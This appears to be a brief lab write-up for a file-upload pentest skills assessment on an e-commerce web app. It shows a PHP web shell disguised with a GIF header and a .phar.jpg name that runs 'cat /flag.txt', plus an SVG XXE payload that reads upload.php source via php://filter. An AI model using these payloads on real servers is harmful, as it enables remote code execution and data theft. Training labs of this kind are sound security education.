# Skills Assessment
**Task**
You are contracted to perform a pentest for a company's e-commerce web app. The web app is in its early stages, so you only be testing any file upload forms you can find.

Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validation in place to gain remote code execution on the back-end server.

Try to note down the main security issues found with the web application and the necessary security measures to mitigate and prevent exploitation

Try to exploit the upload from to read the flag on the root directory "/"

**Step**
upload the file 'file_upload.phar.jpg' 
```php
GIF8
<?php system('cat /flag.txt'); ?>
```
Its MIME type imitaes gif too. 


tweaked a payload from PayloadsAllTheThing
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
saved it as svg_xxe.jpg and upload it.